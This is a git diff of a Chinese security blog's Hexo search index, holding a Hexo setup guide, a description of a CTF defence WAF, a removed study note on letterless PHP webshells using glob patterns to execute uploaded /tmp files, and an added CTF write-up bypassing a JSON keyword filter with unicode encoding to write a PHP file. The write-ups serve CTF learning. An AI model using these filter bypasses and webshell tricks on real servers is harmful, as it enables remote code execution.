@@ -1,6 +1,91 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>HEXO+Githubpage搭建博客</title>
+    <url>//articles/1558f80b43.html</url>
+    <content><![CDATA[<h2 id="Github新建项目"><a href="#Github新建项目" class="headerlink" title="Github新建项目"></a>Github新建项目</h2><ul>
+<li>这个项目命名方式为:<code>&lt;用户名&gt;.github.io</code> 如下图</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668210563706.png" alt></p>
+<ul>
+<li>打开项目页面选择<code>Clone or download</code>点击<code>Use SSH</code></li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668211846352.png" alt></p>
+<ul>
+<li>复制SSH地址如下图</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/1566821283557.png" alt></p>
+<h2 id="创建SSH公钥"><a href="#创建SSH公钥" class="headerlink" title="创建SSH公钥"></a>创建SSH公钥</h2><pre><code class="shell">ssh-keygen -t rsa -b 4096 -C &quot;你的邮箱@qq.com&quot;
+ssh-add ~/.ssh/id_rsa</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668227842615.png" alt></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668229504873.png" alt></p>
+<ul>
+<li>查看key</li>
+</ul>
+<pre><code>cd /root/.ssh
+cat id_rsa.pub</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668231662963.png" alt></p>
+<ul>
+<li>github创建SSH-KEY,将创建的key值复制上去,保存即可</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668233457778.png" alt></p>
+<ul>
+<li>添加github用户上传用户信息</li>
+</ul>
+<pre><code class="shell">git config --global user.name &quot;你的用户名&quot;
+git config --global user.email “你的邮箱&quot;</code></pre>
+<h2 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h2><pre><code>apt install npm</code></pre><h2 id="安装HEXO"><a href="#安装HEXO" class="headerlink" title="安装HEXO"></a>安装HEXO</h2><pre><code class="shell">npm install -g hexo
+npm install hexo --save
+hexo -v #查看安装是否成功，成功显示版本信息如下图</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668238496198.png" alt></p>
+<h2 id="生成一个博客"><a href="#生成一个博客" class="headerlink" title="生成一个博客"></a>生成一个博客</h2><pre><code class="shell">hexo init &lt;文件夹&gt;
+#如：hexo init myblog</code></pre>
+<p>命令执行后会生成一个文件夹里面是博客文件。下一步进入文件夹，执行<code>hexo g</code>即可生成静态文件再执行<code>hexo s</code>,即可本地预览博客</p>
+<pre><code>hexo g
+hexo s</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668241705588.png" alt></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668242397730.png" alt="img"></p>
+<h2 id="跟换主题"><a href="#跟换主题" class="headerlink" title="跟换主题"></a>跟换主题</h2><p>官方主题网站：<a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a></p>
+<p>找到喜欢的主题，到github搜索，直接clone到主题文件夹下。</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668244631639.png" alt="img"></p>
+<p>复制文件名，修改博客文件夹下的<code>_config.yml</code></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668245176334.png" alt="img"></p>
+<p>themes修改为刚刚克隆下来的文件夹名</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668246396496.png" alt="img"></p>
+<p><code>hexo g 、hexo s</code>本地查看一下效果</p>
+<h2 id="上传至github"><a href="#上传至github" class="headerlink" title="上传至github"></a>上传至github</h2><ul>
+<li>安装git插件</li>
+</ul>
+<pre><code>npm install hexo-deployer-git --save</code></pre><ul>
+<li>修改<code>_config.yml</code>最后为下图，其中repo修改为第一步git项目的ssh地址</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668249164392.png" alt="img"></p>
+<ul>
+<li>上传至github</li>
+</ul>
+<pre><code>hexo g
+hexo d</code></pre><p>打开设置好的项目域名即可查看效果</p>
+<h2 id="上传文章"><a href="#上传文章" class="headerlink" title="上传文章"></a>上传文章</h2><p>将markdown文章放到博客根目录的source/_post下执行<code>hexo g</code>和<code>hexo d</code></p>
+<p>或者hexo new  “文章名”，但是md文件必须遵循下面格式：</p>
+<p>文章头加上如下代码</p>
+<pre><code class="markdown">---
+
+title: Python沙箱逃逸学习笔记
+
+date: 2019-08-15 12:51:44
+
+tags: CTF
+
+---</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668253185151.png" alt="img"></p>
+<h2 id="删除文章"><a href="#删除文章" class="headerlink" title="删除文章"></a>删除文章</h2><p>直接把文件删除再次执行<code>hexo g</code>和<code>hexo d</code></p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>随笔</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hash长度扩展攻击学习笔记</title>
     <url>//articles/1559adf164.html</url>
     <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p> <a href="http://ctf5.shiyanbar.com/web/kzhan.php" target="_blank" rel="noopener">实验吧：让我进去</a></p>
@@ -98,57 +183,6 @@ username=admin&amp;password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%0
       </categories>
       <tags>
         <tag>WriteUp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF-WAF专用于CTF攻防赛的WAF/日志审计系统</title>
-    <url>//articles/1582a2990d.html</url>
-    <content><![CDATA[<h2 id="CTF-WAF"><a href="#CTF-WAF" class="headerlink" title="CTF-WAF"></a>CTF-WAF</h2><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>该项目针对CTF线下AWD比赛临时开发的WAF，能够拦截XSS、SQl、反序列化、菜刀/蚁剑、以及一些CTF常见的危险函数流量。可以绕过对页面检测的check,拦截返回正常页面的html。并且能够对简单payload进行流量转发，自动反打设置好的IP。如果比赛禁止使用通防也可以一键关闭通防，作为流量监控审计所用。欢迎各位大佬对项目进行改进。使用时候可以使用.user.ini将其包含于所有php文件。</p>
-<h2 id="联系方式"><a href="#联系方式" class="headerlink" title="联系方式"></a>联系方式</h2><ul>
-<li><p><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-Gqleung-brightgreen.svg" alt>  </p>
-</li>
-<li><p><img src="https://img.shields.io/badge/%E5%8D%9A%E5%AE%A2-xiao%20leung's%20Blog-blueviolet" alt> </p>
-</li>
-<li><p><a href="https://github.com/sharpleung" target="_blank" rel="noopener"><img src="https://img.shields.io/badge/Github-sharpleung-green?logo=appveyor&style=flat" alt></a></p>
-</li>
-</ul>
-<h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><pre><code class="http">CTF_WAF.php(WAF主要文件)
-waflog(文件夹)
-    .........ip.txt(需要反打的ip)
-    .........log.php(日志审计系统)</code></pre>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><ul>
-<li>将<code>CTF_WAF.php</code>包含进需要保护的文件</li>
-<li>开启<code>WAF</code>开关（<code>CTF_WAF.php</code>代码27行），设置返回页面（<code>CTF_WAF.php</code>代码26行）,</li>
-</ul>
-<pre><code class="php">$this-&gt;Waf_switch=1;//通防开启
-$this-&gt;Waf_switch=0;//通防关闭
-$this-&gt;resultPage=&quot;http://127.0.0.1/&quot;;//返回页面</code></pre>
-<ul>
-<li>设置需要反打（流量转发）的主机，在<code>waflog/ip.txt</code></li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/sharpleung/CTF-WAF/master/picture/15688766013040.png" alt="img"></p>
-<ul>
-<li>模拟对本地主机进行攻击，可以发现并不会返回flag，说明对payload拦截成功</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/sharpleung/CTF-WAF/master/picture/pic2.png" alt="img"></p>
-<ul>
-<li>查看<code>waflog</code>文件夹下发现生成了logs.txt和flag.txt说明生成了日志文件和flag文件，打开即可看到ip对应的flag</li>
-</ul>
-<p><strong><img src="https://raw.githubusercontent.com/sharpleung/CTF-WAF/master/picture/pic3.bmp" alt="img"></strong></p>
-<ul>
-<li>修改日志系统密码<code>/waflog/log.php</code>代码4行，修改密码</li>
-</ul>
-<pre><code class="php">$passwd=&quot;admin&quot;;//修改密码</code></pre>
-<ul>
-<li>登陆后台发现记录了攻击payload。</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/sharpleung/CTF-WAF/master/picture/pic4.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>CTF比赛</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -280,88 +314,54 @@ clause; this is incompatible with sql_mode=only_full_group_by</code></pre></li>
       </tags>
   </entry>
   <entry>
-    <title>HEXO+Githubpage搭建博客</title>
-    <url>//articles/1558f80b43.html</url>
-    <content><![CDATA[<h2 id="Github新建项目"><a href="#Github新建项目" class="headerlink" title="Github新建项目"></a>Github新建项目</h2><ul>
-<li>这个项目命名方式为:<code>&lt;用户名&gt;.github.io</code> 如下图</li>
+    <title>CTF-WAF专用于CTF攻防赛的WAF/日志审计系统</title>
+    <url>//articles/1582a2990d.html</url>
+    <content><![CDATA[<h2 id="CTF-WAF"><a href="#CTF-WAF" class="headerlink" title="CTF-WAF"></a>CTF-WAF</h2><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>该项目针对CTF线下AWD比赛临时开发的WAF，能够拦截XSS、SQl、反序列化、菜刀/蚁剑、以及一些CTF常见的危险函数流量。可以绕过对页面检测的check,拦截返回正常页面的html。并且能够对简单payload进行流量转发，自动反打设置好的IP。如果比赛禁止使用通防也可以一键关闭通防，作为流量监控审计所用。欢迎各位大佬对项目进行改进。使用时候可以使用.user.ini将其包含于所有php文件。</p>
+<h2 id="联系方式"><a href="#联系方式" class="headerlink" title="联系方式"></a>联系方式</h2><ul>
+<li><p><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-Gqleung-brightgreen.svg" alt>  </p>
+</li>
+<li><p><img src="https://img.shields.io/badge/%E5%8D%9A%E5%AE%A2-xiao%20leung's%20Blog-blueviolet" alt> </p>
+</li>
+<li><p><a href="https://github.com/sharpleung" target="_blank" rel="noopener"><img src="https://img.shields.io/badge/Github-sharpleung-green?logo=appveyor&style=flat" alt></a></p>
+</li>
 </ul>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668210563706.png" alt></p>
+<h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><pre><code class="http">CTF_WAF.php(WAF主要文件)
+waflog(文件夹)
+    .........ip.txt(需要反打的ip)
+    .........log.php(日志审计系统)</code></pre>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><ul>
+<li>将<code>CTF_WAF.php</code>包含进需要保护的文件</li>
+<li>开启<code>WAF</code>开关（<code>CTF_WAF.php</code>代码27行），设置返回页面（<code>CTF_WAF.php</code>代码26行）,</li>
+</ul>
+<pre><code class="php">$this-&gt;Waf_switch=1;//通防开启
+$this-&gt;Waf_switch=0;//通防关闭
+$this-&gt;resultPage=&quot;http://127.0.0.1/&quot;;//返回页面</code></pre>
 <ul>
-<li>打开项目页面选择<code>Clone or download</code>点击<code>Use SSH</code></li>
+<li>设置需要反打（流量转发）的主机，在<code>waflog/ip.txt</code></li>
 </ul>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668211846352.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/sharpleung/CTF-WAF/master/picture/15688766013040.png" alt="img"></p>
 <ul>
-<li>复制SSH地址如下图</li>
+<li>模拟对本地主机进行攻击，可以发现并不会返回flag，说明对payload拦截成功</li>
 </ul>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/1566821283557.png" alt></p>
-<h2 id="创建SSH公钥"><a href="#创建SSH公钥" class="headerlink" title="创建SSH公钥"></a>创建SSH公钥</h2><pre><code class="shell">ssh-keygen -t rsa -b 4096 -C &quot;你的邮箱@qq.com&quot;
-ssh-add ~/.ssh/id_rsa</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668227842615.png" alt></p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668229504873.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/sharpleung/CTF-WAF/master/picture/pic2.png" alt="img"></p>
 <ul>
-<li>查看key</li>
+<li>查看<code>waflog</code>文件夹下发现生成了logs.txt和flag.txt说明生成了日志文件和flag文件，打开即可看到ip对应的flag</li>
 </ul>
-<pre><code>cd /root/.ssh
-cat id_rsa.pub</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668231662963.png" alt></p>
+<p><strong><img src="https://raw.githubusercontent.com/sharpleung/CTF-WAF/master/picture/pic3.bmp" alt="img"></strong></p>
 <ul>
-<li>github创建SSH-KEY,将创建的key值复制上去,保存即可</li>
+<li>修改日志系统密码<code>/waflog/log.php</code>代码4行，修改密码</li>
 </ul>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668233457778.png" alt></p>
+<pre><code class="php">$passwd=&quot;admin&quot;;//修改密码</code></pre>
 <ul>
-<li>添加github用户上传用户信息</li>
+<li>登陆后台发现记录了攻击payload。</li>
 </ul>
-<pre><code class="shell">git config --global user.name &quot;你的用户名&quot;
-git config --global user.email “你的邮箱&quot;</code></pre>
-<h2 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h2><pre><code>apt install npm</code></pre><h2 id="安装HEXO"><a href="#安装HEXO" class="headerlink" title="安装HEXO"></a>安装HEXO</h2><pre><code class="shell">npm install -g hexo
-npm install hexo --save
-hexo -v #查看安装是否成功，成功显示版本信息如下图</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668238496198.png" alt></p>
-<h2 id="生成一个博客"><a href="#生成一个博客" class="headerlink" title="生成一个博客"></a>生成一个博客</h2><pre><code class="shell">hexo init &lt;文件夹&gt;
-#如：hexo init myblog</code></pre>
-<p>命令执行后会生成一个文件夹里面是博客文件。下一步进入文件夹，执行<code>hexo g</code>即可生成静态文件再执行<code>hexo s</code>,即可本地预览博客</p>
-<pre><code>hexo g
-hexo s</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668241705588.png" alt></p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668242397730.png" alt="img"></p>
-<h2 id="跟换主题"><a href="#跟换主题" class="headerlink" title="跟换主题"></a>跟换主题</h2><p>官方主题网站：<a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a></p>
-<p>找到喜欢的主题，到github搜索，直接clone到主题文件夹下。</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668244631639.png" alt="img"></p>
-<p>复制文件名，修改博客文件夹下的<code>_config.yml</code></p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668245176334.png" alt="img"></p>
-<p>themes修改为刚刚克隆下来的文件夹名</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668246396496.png" alt="img"></p>
-<p><code>hexo g 、hexo s</code>本地查看一下效果</p>
-<h2 id="上传至github"><a href="#上传至github" class="headerlink" title="上传至github"></a>上传至github</h2><ul>
-<li>安装git插件</li>
-</ul>
-<pre><code>npm install hexo-deployer-git --save</code></pre><ul>
-<li>修改<code>_config.yml</code>最后为下图，其中repo修改为第一步git项目的ssh地址</li>
-</ul>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668249164392.png" alt="img"></p>
-<ul>
-<li>上传至github</li>
-</ul>
-<pre><code>hexo g
-hexo d</code></pre><p>打开设置好的项目域名即可查看效果</p>
-<h2 id="上传文章"><a href="#上传文章" class="headerlink" title="上传文章"></a>上传文章</h2><p>将markdown文章放到博客根目录的source/_post下执行<code>hexo g</code>和<code>hexo d</code></p>
-<p>或者hexo new  “文章名”，但是md文件必须遵循下面格式：</p>
-<p>文章头加上如下代码</p>
-<pre><code class="markdown">---
-
-title: Python沙箱逃逸学习笔记
-
-date: 2019-08-15 12:51:44
-
-tags: CTF
-
----</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668253185151.png" alt="img"></p>
-<h2 id="删除文章"><a href="#删除文章" class="headerlink" title="删除文章"></a>删除文章</h2><p>直接把文件删除再次执行<code>hexo g</code>和<code>hexo d</code></p>
+<p><img src="https://raw.githubusercontent.com/sharpleung/CTF-WAF/master/picture/pic4.png" alt="img"></p>
 ]]></content>
       <categories>
-        <category>随笔</category>
+        <category>CTF比赛</category>
       </categories>
       <tags>
-        <tag>随笔</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -965,82 +965,377 @@ class Cache{
       </tags>
   </entry>
   <entry>
-    <title>《无字母数字webshell之提高篇》读书笔记</title>
-    <url>//articles/b7770c5dc9b5b.html</url>
-    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><ul>
-<li>前几天曾经教过的学员给我甩来了这么一道题。虽然想出了用通配符做，但是没有实际做出来，总的来说就是对无字母的webshell学习不够仔细，限于做出一道CTF题目为止的，蜻蜓点水的状态。</li>
+    <title>西湖论剑Easyjson Write up</title>
+    <url>//articles/2a808de4a49b19.html</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>太菜了只做了一道</p>
+</blockquote>
+<h2 id="Easyjson"><a href="#Easyjson" class="headerlink" title="Easyjson"></a>Easyjson</h2><ul>
+<li>代码审计</li>
 </ul>
-<h3 id="题目解决流程"><a href="#题目解决流程" class="headerlink" title="题目解决流程"></a>题目解决流程</h3><h4 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h4><pre><code class="php"> &lt;?php
-if(isset($_GET[&#39;evil&#39;])){
-    if(strlen($_GET[&#39;evil&#39;])&gt;25||preg_match(&quot;/[\w$=()&lt;&gt;&#39;\&quot;]/&quot;, $_GET[&#39;evil&#39;])){
-        die(&quot;danger!!&quot;);
-    }
-    @eval($_GET[&#39;evil&#39;]);
+<pre><code class="php"> &lt;?php
+include &#39;security.php&#39;;
+
+if(!isset($_GET[&#39;source&#39;])){
+    show_source(__FILE__);
+    die();
 }
-highlight_file(__FILE__);
-?&gt;</code></pre>
-<h4 id="单个字符的Fuzz"><a href="#单个字符的Fuzz" class="headerlink" title="单个字符的Fuzz"></a>单个字符的Fuzz</h4><ul>
-<li>题目主要是过滤了单个字符，这种Fuzz能够快速得知我们还有哪些字符能够用。编写一个脚本：</li>
-</ul>
-<pre><code class="php">&lt;?php
-for ($ascii = 0; $ascii &lt; 256; $ascii++) {
-    if (!preg_match(&quot;/[\w$=()&lt;&gt;&#39;\&quot;]/&quot;, chr($ascii))) {
-        echo (chr($ascii));
+$sandbox = &#39;sandbox/&#39;.sha1($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]).&#39;/&#39;;
+var_dump($sandbox);
+if(!file_exists($sandbox)){
+    mkdir($sandbox);
+    file_put_contents($sandbox.&quot;index.php&quot;,&quot;&lt;?php echo &#39;Welcome To Dbapp OSS.&#39;;?&gt;&quot;);
+}
+$action = $_GET[&#39;action&#39;];
+$content = file_get_contents(&quot;php://input&quot;);
+
+
+if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
+    $content = json_decode($content);
+    $filename = $_GET[&#39;filename&#39;];
+    $filecontent = $content-&gt;content;
+    $filename = $sandbox.$filename;
+    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
+}elseif($action == &quot;reset&quot;){
+    $files = scandir($sandbox);
+    foreach($files as $file) {
+        if(!is_dir($file)){
+            if($file !== &quot;index.php&quot;){
+                unlink($sandbox.$file);
+            }
+        }
     }
 }
-?&gt;
-//运行结果
-// !#%&amp;*+,-./:;?@[\]^`{|}~��������������������������������������������������������������������������������������������������������������������������������[Finished in 0.3s]
+else{
+    die(&#39;Security Check Failed.&#39;);
+}
 </code></pre>
 <ul>
-<li>可以快速地看到，我们呢广告用 的只有(!#%&amp;*+,-./:;?@[]^`{|}~),这里$,()都已经被过滤，不论是取反、异或、或运算、位运算都是通过动态拼接函数来实现执行任意代码的。这里还不能使用可见的字符，使用require来包含flag也是不可能实现的。这里还能用的就是反引号了。我们知道反引号能执行shell,它本质就是调用shell_exec,这个函数执行的shell是不会有回显的，就算catflag也不会显示出来。做到这里基本就没有思路了。</li>
+<li>代码主要部分在,但是这里有一个waf对文件名和content参数进行过滤。简单Fuzz了一下，filename可以使用php后缀，说明可以写php文件，但是有一个很关键的问题就是<code>content</code>它传来必须是一个json,json中有一个属性是content，例如：<code>{&#39;content&#39;:&#39;&lt;?=phpinfo()?&gt;&#39;}</code>但是<code>waf</code>对json进行了过滤，不能存在content这个字符串(还过滤了其他关键字)。</li>
 </ul>
-<h4 id="有趣的Linux-shell"><a href="#有趣的Linux-shell" class="headerlink" title="有趣的Linux shell"></a>有趣的Linux shell</h4><ul>
-<li>回看P神的<code>《无字母数字webshell之提高篇》</code> ，可以 知道这么两个有趣的shell知识点：</li>
-</ul>
-<blockquote>
-<p>1.shell下可以利用<code>.</code>来执行任意脚本</p>
-<p>2.Linux文件名支持用glob通配符代替</p>
-</blockquote>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201015-090013@2x.png" alt="WX20201015-090013@2x"></p>
+<pre><code class="php">if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
+    $content = json_decode($content);
+    $filename = $_GET[&#39;filename&#39;];
+    $filecontent = $content-&gt;content;
+    $filename = $sandbox.$filename;
+    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
+}</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001234@2x.png" alt="WX20201009-001234@2x"></p>
 <ul>
-<li>但是我们用通配符来执行这个SB脚本的时候却会报错：</li>
+<li>神小密圈发现，json支持的字符中可以支持unicode编码，那么我们全都用unicode编码来代替字符串不就行了？</li>
 </ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201015-090353@2x.png" alt="WX20201015-090353@2x"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG59.jpeg" alt="WechatIMG59"></p>
 <ul>
-<li>这说明我们能够匹配上<code>??</code>的文件或者目录很多，我们直接列出来看看</li>
+<li>简单测试一下发现可以.<a href="https://blog.csdn.net/weixin_30654419/article/details/97554779?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param" target="_blank" rel="noopener">Unicode表</a></li>
 </ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201015-093749@2x.png" alt="WX20201015-093749@2x"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG72.png" alt="WechatIMG72"></p>
 <ul>
-<li>这说明两个字符的文件还是有很多的，我们必须匹配上我们唯一的文件才有可能直线我们想要直接的代码。</li>
+<li>简单写个脚本来将字符串转化为unicode编码。</li>
 </ul>
-<h5 id="有趣的glob通配符"><a href="#有趣的glob通配符" class="headerlink" title="有趣的glob通配符"></a>有趣的glob通配符</h5><ul>
-<li>我们都认识<code>*?</code>这两个通配符，其实在glob语法里面还支持类似于正则表达式的语法。例如<code>[^S]</code>就是排除掉S字母,我们可以排除掉S字母然后再列目录看看，就会发现SB这个文件被排除在外。</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201015-094327@2x.png" alt="WX20201015-094327@2x"></p>
+<pre><code class="php">&lt;?php
+
+function unicode_encode($str){
+    $table = [
+            &#39;\u002&#39;=&gt;[&#39; &#39;,&#39;!&#39;,&#39;&quot;&#39;,&#39;#&#39;,&#39;$&#39;,&#39;%&#39;,&#39;&amp;&#39;,&#39;\&#39;&#39;,&#39;(&#39;,&#39;)&#39;,&#39;*&#39;,&#39;+&#39;,&#39;,&#39;,&#39;-&#39;,&#39;.&#39;,&#39;/&#39;],
+            &#39;\u003&#39;=&gt;[&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;:&#39;,&#39;;&#39;,&#39;&lt;&#39;,&#39;=&#39;,&#39;&gt;&#39;,&#39;?&#39;],
+            &#39;\u004&#39;=&gt;[&#39;@&#39;,&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;],
+            &#39;\u005&#39;=&gt;[&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;[&#39;,&#39;\\&#39;,&#39;]&#39;,&#39;^&#39;,&#39;_&#39;],
+            &#39;\u006&#39;=&gt;[&#39;`&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;],
+            &#39;\u007&#39;=&gt;[&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;{&#39;,&#39;|&#39;,&#39;}&#39;,&#39;~&#39;]
+];
+    foreach ($table as $key =&gt; $value) {
+        $i = 0;
+        foreach ($value as $vcode) {
+            $i=$i+1;
+            if($str==$vcode){
+                return $key.bin2e($i-1);
+            }
+
+        }
+    }
+
+}
+
+function bin2e($str){
+    switch ($str) {
+        case &#39;10&#39;:
+            return &#39;a&#39;;
+            break;
+        case &#39;11&#39;:
+            return &#39;b&#39;;
+            break;
+        case &#39;12&#39;:
+            return &#39;c&#39;;
+            break;
+        case &#39;13&#39;:
+            return &#39;d&#39;;
+            break;
+        case &#39;14&#39;:
+            return &#39;e&#39;;
+            break;
+        case &#39;15&#39;:
+            return &#39;f&#39;;
+            break;
+        default:
+            return $str;
+            break;
+    }
+}
+
+function main($str){
+for($i=0;$i&lt;strlen($str);$i++){
+    echo unicode_encode($str[$i]);
+}
+}
+
+
+main(&#39;&lt;?=phpinfo()?&gt;&#39;);
+?&gt;</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000458@2x.png" alt="WX20201009-000458@2x"></p>
 <ul>
-<li>但是这里我们的要求是不能有字母数字，我们刚才说了glob是支持类似正则表达式的用法，如<code>[0-9]</code>,是支持的，那么我们在aiisc表中找出两个包含大写字母之间的字符就行了这样我们就能够成功获取到SB文件。</li>
+<li>EXP</li>
 </ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/aiisc.png" alt="aiisc"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000600@2x.png" alt="WX20201009-000600@2x"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000806@2x.png" alt="WX20201009-000806@2x"></p>
 <ul>
-<li>从AIISC表中我们可以知道，<code>@-[</code>是在大写字母之间的，那么我构造<code>[@-[]?</code>是不是能够匹配到SB了呢？答案是肯定的。</li>
+<li>Getflag</li>
 </ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201015-145223@2x.png" alt="WX20201015-145223@2x"></p>
-<ul>
-<li>其实我们PHP在接受上传表单的文件流后会将文件保存到<code>/tmp</code>文件夹中，不论后端是否有编写上传的代码。而这个文件类似于这样的命名方式：<code>/tmp/phpXXXXXX</code>.</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/67a4aab1-9e90-43e6-b3f1-3569c7009390.423d9ca7066c.png" alt="67a4aab1-9e90-43e6-b3f1-3569c7009390.423d9ca7066c"></p>
-<ul>
-<li>和上面讨论的一样，这样匹配出来的回匹配到很多文件，我哦们可以看到后面两位或者一位可能是大写这样我们就可以用<code>.+/???/????????[@-[]</code>来匹配执行文件。</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201015-212645@2x.png" alt="WX20201015-212645@2x"></p>
-<ul>
-<li>直接getflag</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201015-212949@2x.png" alt="WX20201015-212949@2x"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001124@2x.png" alt="WX20201009-001124@2x"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001031@2x.png" alt></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000938@2x.png" alt="WX20201009-000938@2x"></p>
 ]]></content>
       <tags>
         <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java反射学习</title>
+    <url>//articles/58699674516d08.html</url>
